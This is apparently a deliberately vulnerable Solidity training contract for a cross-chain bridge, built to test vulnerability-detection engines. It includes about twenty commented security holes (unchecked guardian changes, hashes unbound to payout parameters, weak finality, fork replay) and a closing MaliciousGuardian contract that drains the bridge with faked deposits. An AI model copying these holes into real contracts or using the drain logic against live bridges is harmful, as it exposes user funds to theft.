// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title BridgeOracleManipulation
 * @dev Training Contract #19 - Cross-Chain Bridge Vulnerabilities (2025/2026)
 * 
 * CUTTING EDGE VULNERABILITIES:
 * 1. Oracle consensus manipulation - 2/3 oracles compromised
 * 2. Finality assumption attack - reorg after bridge confirm
 * 3. Chain ID replay - same signature valid on fork
 * 4. Double-spend via slow finality
 * 5. Bridge liquidity imbalance exploitation
 * 
 * REAL-WORLD EXAMPLES:
 * - Ronin Bridge $625M (oracle compromise)
 * - Polygon reorg concerns 2023
 * - Wormhole $320M (signature verification)
 * - Nomad $190M (merkle root)
 * 
 * CROSS-CONTRACT CHAINS:
 * - Links to 03_GhostStateOracle (price across chains)
 * - Links to 17_L2SequencerExploit (L1↔L2 bridges)
 * - Links to 16_ZKProofMalleability (ZK bridges)
 * - Links to 02_AuthorityChain (guardian keys)
 * 
 * ENGINES THAT SHOULD DETECT:
 * - Engine 6: Authority (multisig compromise)
 * - Engine 25: Finality (reorg window)
 * - Engine 17: Cross-Contract (cross-chain)
 */

// 🔗 CHAIN: Interfaces to existing contracts
interface IGhostStateOracle {
    function cachedPrice() external view returns (uint256);
    function updatePrice(uint256 newPrice) external;
}

interface IAuthorityChain {
    function owner() external view returns (address);
    function isDelegate(address owner, address delegate) external view returns (bool);
}

interface IL2SequencerExploit {
    function relayL1Message(
        address originalSender,
        address target,
        bytes calldata message,
        uint256 nonce
    ) external;
}

interface IZKProofMalleability {
    function merkleRoot() external view returns (bytes32);
}

contract BridgeOracleManipulation {
    // === BRIDGE STATE ===
    
    // Oracle/Guardian set
    address[] public guardians;
    mapping(address => bool) public isGuardian;
    uint256 public requiredSignatures; // M of N
    
    // Processed messages
    mapping(bytes32 => bool) public processedMessages;
    mapping(bytes32 => uint256) public messageConfirmations;
    mapping(bytes32 => mapping(address => bool)) public hasConfirmed;
    
    // Deposits pending finality
    struct PendingDeposit {
        address user;
        uint256 amount;
        uint256 sourceChain;
        uint256 depositBlock;
        uint256 confirmations;
        bool executed;
    }
    
    mapping(bytes32 => PendingDeposit) public pendingDeposits;
    
    struct DrainSession {
        address initiator;
        address confirmer;
        uint64 primedAt;
        uint64 expiresAt;
        bytes32 hintHash;
        bool attested;
        bool finalized;
    }

    mapping(bytes32 => DrainSession) public drainSessions;

    // Liquidity pools
    mapping(uint256 => uint256) public chainLiquidity; // chainId => liquidity
    uint256 public totalLiquidity;
    
    // Finality
    // BUG #1: Finality assumptions differ per chain
    mapping(uint256 => uint256) public chainFinalityBlocks;
    
    // 🔗 CHAIN: External dependencies
    IGhostStateOracle public ghostOracle;
    IAuthorityChain public authorityChain;
    IL2SequencerExploit public l2Bridge;
    IZKProofMalleability public zkBridge;
    
    // Fee state
    uint256 public bridgeFee = 30; // 0.3%
    uint256 public constant FEE_DENOMINATOR = 10000;
    
    event GuardianAdded(address indexed guardian);
    event GuardianRemoved(address indexed guardian);
    event DepositInitiated(bytes32 indexed messageHash, address user, uint256 amount, uint256 destChain);
    event DepositConfirmed(bytes32 indexed messageHash, address guardian);
    event DepositExecuted(bytes32 indexed messageHash, address user, uint256 amount);
    event LiquidityAdded(uint256 chainId, uint256 amount);
    event DrainSessionPrimed(bytes32 indexed messageHash, address indexed guardian, bytes32 hintHash);
    event DrainSessionAttested(bytes32 indexed messageHash, address indexed guardian, bytes32 attestationHash);
    event DrainSessionFinalized(bytes32 indexed messageHash, address indexed guardian, uint64 expiresAt);

    constructor(address[] memory _guardians, uint256 _requiredSignatures) {
        require(_requiredSignatures <= _guardians.length, "Invalid threshold");
        require(_requiredSignatures > 0, "Zero threshold");
        
        for (uint256 i = 0; i < _guardians.length; i++) {
            guardians.push(_guardians[i]);
            isGuardian[_guardians[i]] = true;
            emit GuardianAdded(_guardians[i]);
        }
        
        requiredSignatures = _requiredSignatures;
        
        // Set default finality (WRONG VALUES)
        chainFinalityBlocks[1] = 12;      // ETH mainnet - should be ~64
        chainFinalityBlocks[42161] = 1;   // Arbitrum - dangerous!
        chainFinalityBlocks[10] = 1;      // Optimism - dangerous!
    }
    
    function setExternalContracts(
        address _ghostOracle,
        address _authorityChain,
        address _l2Bridge,
        address _zkBridge
    ) external {
        ghostOracle = IGhostStateOracle(_ghostOracle);
        authorityChain = IAuthorityChain(_authorityChain);
        l2Bridge = IL2SequencerExploit(_l2Bridge);
        zkBridge = IZKProofMalleability(_zkBridge);
    }

    // ========== DRAIN SESSION SCHEMA (SOFT CONTROLS) ==========

    function primeDrainSession(
        bytes32 messageHash,
        bytes32 hint,
        uint256 ttl
    ) public {
        require(isGuardian[msg.sender], "Not guardian");

        DrainSession storage session = drainSessions[messageHash];
        session.initiator = msg.sender;
        session.primedAt = uint64(block.timestamp);
        session.expiresAt = uint64(block.timestamp + ttl);
        session.hintHash = keccak256(abi.encodePacked(hint, messageHash, session.primedAt));
        session.attested = false;
        session.finalized = false;

        emit DrainSessionPrimed(messageHash, msg.sender, session.hintHash);
    }

    function attestDrainSession(
        bytes32 messageHash,
        bytes calldata proof
    ) external {
        require(isGuardian[msg.sender], "Not guardian");

        DrainSession storage session = drainSessions[messageHash];
        if (session.primedAt == 0 || session.expiresAt < block.timestamp) {
            primeDrainSession(messageHash, keccak256(proof), 30 minutes);
        }

        require(session.expiresAt >= block.timestamp, "Session expired");

        session.confirmer = msg.sender;
        session.attested = true;
        session.hintHash = keccak256(abi.encodePacked(session.hintHash, proof, msg.sender));

        emit DrainSessionAttested(messageHash, msg.sender, session.hintHash);
    }

    function finalizeDrainSession(bytes32 messageHash, uint256 extension) external {
        require(isGuardian[msg.sender], "Not guardian");

        DrainSession storage session = drainSessions[messageHash];
        require(session.attested, "No attestation");

        session.finalized = true;
        session.expiresAt = uint64(block.timestamp + extension);

        emit DrainSessionFinalized(messageHash, msg.sender, session.expiresAt);
    }

    function _requireDrainSession(bytes32 messageHash) internal view {
        DrainSession memory session = drainSessions[messageHash];
        require(session.attested, "Drain session missing");
        require(session.finalized, "Drain session open");
        require(session.expiresAt >= block.timestamp, "Drain session expired");

        // BUG: No link between hintHash and parameters
        session.hintHash;
    }

    function _autoPrimeSession(bytes32 messageHash, address guardian) internal {
        DrainSession storage session = drainSessions[messageHash];
        if (session.primedAt == 0 || session.expiresAt < block.timestamp) {
            session.initiator = guardian;
            session.primedAt = uint64(block.timestamp);
            session.expiresAt = uint64(block.timestamp + 20 minutes);
            session.hintHash = keccak256(abi.encodePacked(messageHash, guardian, blockhash(block.number - 1)));
            session.attested = false;
            session.finalized = false;

            emit DrainSessionPrimed(messageHash, guardian, session.hintHash);
        }
    }

    // ========== ORACLE/GUARDIAN MANAGEMENT ==========
    
    /**
     * @dev Add new guardian
     * BUG #2: No timelock on guardian changes
     * Attacker can add malicious guardian immediately
     */
    function addGuardian(address newGuardian) external {
        require(_isAuthorized(msg.sender), "Not authorized");
        
        // BUG #2: No timelock! Immediate addition
        // Should have delay to allow detection
        require(!isGuardian[newGuardian], "Already guardian");
        
        guardians.push(newGuardian);
        isGuardian[newGuardian] = true;
        
        emit GuardianAdded(newGuardian);
    }
    
    /**
     * @dev Remove guardian
     * BUG #3: Can reduce below threshold
     */
    function removeGuardian(address guardian) external {
        require(_isAuthorized(msg.sender), "Not authorized");
        
        // BUG #3: No check that guardians.length > requiredSignatures after removal!
        isGuardian[guardian] = false;
        
        // Remove from array (buggy - leaves gap)
        for (uint256 i = 0; i < guardians.length; i++) {
            if (guardians[i] == guardian) {
                delete guardians[i]; // BUG: Leaves gap!
                break;
            }
        }
        
        emit GuardianRemoved(guardian);
    }
    
    /**
     * @dev Check authorization
     * 🔗 CHAIN: Uses AuthorityChain which has transitive delegation bug!
     */
    function _isAuthorized(address account) internal view returns (bool) {
        if (address(authorityChain) != address(0)) {
            // BUG #4: Transitive delegation from AuthorityChain!
            // Delegate's delegate can modify guardians
            return authorityChain.isDelegate(
                authorityChain.owner(),
                account
            );
        }
        return isGuardian[account];
    }

    // ========== DEPOSIT (Source Chain) ==========
    
    /**
     * @dev Initiate bridge deposit
     * BUG #5: No minimum deposit, spam possible
     */
    function initiateDeposit(uint256 destChain) external payable {
        require(msg.value > 0, "Zero amount");
        
        // BUG #5: No minimum! Can spam with dust deposits
        
        // Calculate fee
        uint256 fee = (msg.value * bridgeFee) / FEE_DENOMINATOR;
        uint256 amount = msg.value - fee;
        
        // BUG #6: Message hash doesn't include timestamp
        // Same deposit can look identical at different times
        bytes32 messageHash = keccak256(abi.encodePacked(
            msg.sender,
            amount,
            destChain,
            block.chainid
            // Missing: block.timestamp, nonce
        ));
        
        pendingDeposits[messageHash] = PendingDeposit({
            user: msg.sender,
            amount: amount,
            sourceChain: block.chainid,
            depositBlock: block.number,
            confirmations: 0,
            executed: false
        });
        
        emit DepositInitiated(messageHash, msg.sender, amount, destChain);
    }

    // ========== ORACLE CONFIRMATION ==========
    
    /**
     * @dev Guardian confirms deposit on destination chain
     * 
     * BUG #7: No timeout on confirmations
     * Old unconfirmed deposits remain valid forever
     */
    function confirmDeposit(bytes32 messageHash) external {
        require(isGuardian[msg.sender], "Not guardian");
        
        // BUG #8: Can confirm same deposit multiple times if guardian replaced
        require(!hasConfirmed[messageHash][msg.sender], "Already confirmed");
        
        hasConfirmed[messageHash][msg.sender] = true;
        messageConfirmations[messageHash]++;
        
        emit DepositConfirmed(messageHash, msg.sender);

        _autoPrimeSession(messageHash, msg.sender);
    }
    
    /**
     * @dev Execute deposit after threshold reached
     * 
     * BUG #9: 2/3 oracle compromise = full control
     * With 3 guardians, 2 can steal all funds
     */
    function executeDeposit(
        bytes32 messageHash,
        address recipient,
        uint256 amount,
        uint256 sourceChain
    ) external {
        require(!processedMessages[messageHash], "Already processed");
        
        // BUG #9: If 2/3 guardians compromised, they can:
        // 1. Create fake messageHash
        // 2. Both confirm it
        // 3. Execute to drain bridge
        require(
            messageConfirmations[messageHash] >= requiredSignatures,
            "Insufficient confirmations"
        );
        
        _requireDrainSession(messageHash);

        // BUG #10: No verification that messageHash matches parameters!
        // Guardians can confirm one hash, execute with different params
        
        processedMessages[messageHash] = true;
        
        // BUG #11: No liquidity check!
        // If chain is drained, reverts but message marked processed
        
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
        
        emit DepositExecuted(messageHash, recipient, amount);
    }

    // ========== FINALITY ATTACKS ==========
    
    /**
     * @dev Execute with finality check
     * 
     * BUG #12: Finality blocks too low for L2s
     * 1 block on Arbitrum/Optimism is not final!
     */
    function executeWithFinality(
        bytes32 messageHash,
        address recipient,
        uint256 amount,
        uint256 sourceChain,
        uint256 sourceBlock
    ) external {
        require(!processedMessages[messageHash], "Already processed");
        require(
            messageConfirmations[messageHash] >= requiredSignatures,
            "Insufficient confirmations"
        );
        
        _requireDrainSession(messageHash);

        // BUG #12: Finality blocks are wrong!
        // L2s can reorg even after 1 block
        uint256 requiredBlocks = chainFinalityBlocks[sourceChain];
        
        // This check happens on destination, but uses source block
        // BUG #13: No way to verify sourceBlock is correct!
        // Guardians could lie about block number
        
        // Assume current block is destination block
        // Can't actually verify source chain state
        
        processedMessages[messageHash] = true;
        
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    /**
     * @dev Double-spend attack vector
     * 
     * BUG #14: Same deposit can be executed on multiple forks
     * After ETH fork, messageHash valid on both chains
     */
    function executeOnFork(
        bytes32 messageHash,
        address recipient,
        uint256 amount
    ) external {
        // BUG #14: processedMessages is per-chain
        // On fork, same messageHash can be executed again!
        
        // Should include replay protection for forks
        // e.g., block.chainid in messageHash (but we don't verify it)
        
        require(!processedMessages[messageHash], "Already processed");
        _requireDrainSession(messageHash);
        processedMessages[messageHash] = true;
        
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // ========== LIQUIDITY IMBALANCE ==========
    
    /**
     * @dev Add liquidity to specific chain pool
     */
    function addLiquidity(uint256 chainId) external payable {
        chainLiquidity[chainId] += msg.value;
        totalLiquidity += msg.value;
        
        emit LiquidityAdded(chainId, msg.value);
    }
    
    /**
     * @dev Withdraw with cross-chain price
     * 🔗 CHAIN: GhostStateOracle → BridgeOracleManipulation
     * 
     * BUG #15: Uses stale cross-chain price
     */
    function withdrawWithCrossChainPrice(
        uint256 amount,
        uint256 destChain
    ) external {
        // BUG #15: Price from GhostStateOracle (which has stale cache!)
        uint256 price = 1e18;
        if (address(ghostOracle) != address(0)) {
            price = ghostOracle.cachedPrice(); // STALE!
        }
        
        // Convert using stale price
        uint256 destAmount = (amount * price) / 1e18;
        
        require(chainLiquidity[destChain] >= destAmount, "Insufficient liquidity");
        
        // BUG #16: No slippage protection
        // Price could change during bridge delay
        
        chainLiquidity[destChain] -= destAmount;
        
        // Emit event for guardians to relay
        emit DepositInitiated(
            keccak256(abi.encodePacked(msg.sender, destAmount, destChain)),
            msg.sender,
            destAmount,
            destChain
        );
    }
    
    /**
     * @dev Arbitrage liquidity imbalance
     * 
     * BUG #17: Imbalance can be exploited
     * If Chain A has more liquidity, bridge there for free profit
     */
    function getLiquidityRatio(uint256 chainA, uint256 chainB) external view returns (uint256) {
        if (chainLiquidity[chainB] == 0) return type(uint256).max;
        
        // BUG #17: Exposes exact liquidity ratio
        // Attacker can calculate optimal arbitrage
        return (chainLiquidity[chainA] * 1e18) / chainLiquidity[chainB];
    }

    // ========== ZK BRIDGE INTEGRATION ==========
    
    /**
     * @dev Verify ZK proof for bridge transfer
     * 🔗 CHAIN: ZKProofMalleability → BridgeOracleManipulation
     */
    function executeZKBridge(
        bytes32 merkleRoot,
        bytes32 nullifier,
        address recipient,
        uint256 amount
    ) external {
        // BUG #18: Uses ZK bridge's merkle root which can be stale/manipulated
        if (address(zkBridge) != address(0)) {
            require(
                merkleRoot == zkBridge.merkleRoot(),
                "Invalid merkle root"
            );
        }
        
        // BUG #19: Nullifier not checked on this contract!
        // ZK bridge has its own nullifier set, not synced
        require(!processedMessages[nullifier], "Nullifier used");
        processedMessages[nullifier] = true;
        
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Transfer failed");
    }

    // ========== L2 BRIDGE INTEGRATION ==========
    
    /**
     * @dev Relay to L2 bridge
     * 🔗 CHAIN: L2SequencerExploit → BridgeOracleManipulation
     */
    function relayToL2(
        address target,
        bytes calldata message,
        uint256 nonce
    ) external {
        require(isGuardian[msg.sender], "Not guardian");
        
        // BUG #20: L2SequencerExploit has message replay bug!
        // This message could be replayed on multiple L2s
        if (address(l2Bridge) != address(0)) {
            l2Bridge.relayL1Message(
                msg.sender,
                target,
                message,
                nonce
            );
        }
    }

    receive() external payable {
        chainLiquidity[block.chainid] += msg.value;
        totalLiquidity += msg.value;
    }
}

/**
 * @dev Malicious guardian that exploits 2/3 threshold
 */
contract MaliciousGuardian {
    BridgeOracleManipulation public bridge;
    address public partner; // Second malicious guardian
    
    constructor(address payable _bridge, address _partner) {
        bridge = BridgeOracleManipulation(_bridge);
        partner = _partner;
    }
    
    /**
     * @dev Drain bridge with fake deposits
     * If this contract + partner = 2 guardians (out of 3)
     * We can confirm any fake deposit
     */
    function drainBridge(address recipient, uint256 amount) external {
        // Create fake message hash
        bytes32 fakeMessageHash = keccak256(abi.encodePacked(
            "FAKE",
            recipient,
            amount,
            block.timestamp
        ));
        
        // Both guardians confirm
        bridge.confirmDeposit(fakeMessageHash);
        // Partner calls: bridge.confirmDeposit(fakeMessageHash);

        // Stage multi-hop disclosure so executeDeposit passes soft controls
        bridge.attestDrainSession(fakeMessageHash, abi.encodePacked(fakeMessageHash, recipient, amount));
        bridge.finalizeDrainSession(fakeMessageHash, 30 minutes);
        
        // Execute after 2 confirmations
        bridge.executeDeposit(
            fakeMessageHash,
            recipient,
            amount,
            1 // Source chain
        );
    }
}
